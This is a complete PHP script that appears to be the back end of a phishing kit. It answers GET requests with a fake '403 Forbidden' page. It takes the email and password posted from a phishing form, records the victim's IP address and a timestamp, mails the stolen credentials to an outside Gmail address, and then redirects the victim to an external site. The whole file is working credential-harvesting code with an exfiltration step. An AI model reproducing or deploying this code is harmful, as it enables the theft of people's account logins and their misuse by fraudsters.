<?php
session_start();

if ($_SERVER['REQUEST_METHOD'] == 'GET')
{
print '
<html><head>
<title>403 - Forbidden</title>
</head><body>
<h1>403 Forbidden</h1>
<p></p>
<hr>
</body></html>
';
exit;
}


$_SESSION['email'] = $_POST['email']; //This email will be gotten from the post from the form in the other page. the session will send it back. Don't delete the session start above.


$adddate = date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message  = "----+ WT  ReZulT +----\n";
$message .= "Email       : ".$_POST['email']."\n";
$message .= "Password    : ".$_POST['password']."\n";
$message .= "---+ cY63r M4R$#4L +---\n";
$message .= "Date & Time : $adddate\n";
$message .= "IP Address  : ".$ip."\n";
$recipient = "kennethfaith47@gmail.com";
$subject = "WT ReZulT | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location:  http://zpntnnshop.com/xt/index.php?email=".$_POST['email']);
?>


